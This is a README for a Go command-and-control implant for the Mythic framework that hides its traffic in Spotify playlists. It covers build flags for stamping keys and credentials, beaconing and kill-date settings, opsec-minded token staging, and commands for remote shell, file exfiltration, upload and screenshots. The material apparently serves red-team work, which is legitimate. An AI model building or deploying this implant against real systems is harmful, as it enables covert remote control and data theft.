# mythicagent — Mythic "spotify" profile payload

Go agent (payload) that runs on targets and talks to Mythic through the
server-side `spotify` C2 profile container over the Spotify-playlist
transport.

## Build

**`-tags implantonly` is REQUIRED.** It excludes the operator console
(`internal/c2/operator.go`, readline) from `internal/c2`. Without it the
build pulls in readline and will not cross-compile cleanly.

Add `-tags "implantonly noscreenshot"` to also drop the screenshot module
and its platform dependencies (`github.com/kbinani/screenshot`); the
`screenshot` command then reports `error: module not available: screenshot`.

All configuration is stamped at build time via `-ldflags -X` (all string
vars in package main — this is exactly what the Python builder stamps):

```sh
go build -tags implantonly -trimpath \
  -ldflags "-s -w \
    -X main.PayloadUUID=<mythic payload uuid, 36 chars> \
    -X main.AESKeyB64=<base64 aes256_hmac key; empty = plaintext mode> \
    -X main.Passphrase=<spotexfil transport key> \
    -X main.SpotifyUsername=<user> \
    -X main.SpotifyClientID=<id> \
    -X main.SpotifyClientSecret=<secret> \
    -X main.SpotifyRedirectURI=<uri> \
    -X main.SpotifyTokenFile=<path to pre-staged spotipy-format token JSON> \
    -X main.Interval=30 \
    -X main.Jitter=10 \
    -X main.KillDate=2027-01-01T00:00:00Z" \
  ./cmd/mythicagent
```

- `Interval`: seconds, default 30, floored at 20.
- `Jitter`: seconds, default 10, clamped to [0, Interval].
- `KillDate`: RFC3339; empty = none. Agent exits cleanly once past it.

Cross-compile (CGO off keeps the screenshot module happy and avoids
os/user cgo lookups):

```sh
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -tags implantonly ... ./cmd/mythicagent
CGO_ENABLED=0 GOOS=linux   GOARCH=amd64 go build -tags implantonly ... ./cmd/mythicagent
```

## Token staging (opsec)

The agent never opens a browser (`AllowOAuth=false`) and never writes a
`.cache-<user>` token file (`PersistToken=false`). Pre-stage a valid
spotipy-format token JSON via `SpotifyTokenFile` (embedded path) or the
`SPOTIFY_TOKEN_JSON` env var. The token must include a `refresh_token` so
the oauth2 transport can self-renew.

## Runtime flow

1. `checkin` (host metadata, payload UUID) sent as a mythicmap envelope on
   the `res` channel; if Mythic's acknowledgement carries a callback UUID,
   the agent adopts it.
2. Loop: sleep `interval ± jitter` (crypto/rand) → `get_tasking` → execute
   each task sequentially → batched `post_response`. Spotify/API errors
   trigger exponential backoff (sleep doubles, capped at 5 min); the agent
   never crashes on transport errors.
3. `exit` task → final `post_response` (completed=true), then `os.Exit(0)`.

## Command mapping

| Mythic      | parameters                          | spotexfil module |
|-------------|-------------------------------------|------------------|
| `shell`     | `{"command": "..."}`                | `shell`          |
| `sysinfo`   | (none)                              | `sysinfo`        |
| `download`  | plain string path                   | `exfil`          |
| `upload`    | `{"path": "...", "content": b64}`   | `push`           |
| `screenshot`| optional `{"display": 0}`           | `screenshot`     |
| `exit`      | (none)                              | built-in         |

Unknown commands answer with `status: "error: unknown command <name>"`.

## Tests

```sh
go test -tags implantonly ./cmd/mythicagent/ -v
```

## Docker

See `Dockerfile` in this directory for a reproducible cross-build:

```sh
docker build --build-arg TARGETOS=linux --build-arg TARGETARCH=amd64 \
  --build-arg PAYLOAD_UUID=<uuid> --build-arg AES_KEY_B64=<key> \
  ... -o out go/cmd/mythicagent
```
(The build context must be the `go/` directory; adjust the `-f` path
accordingly.)
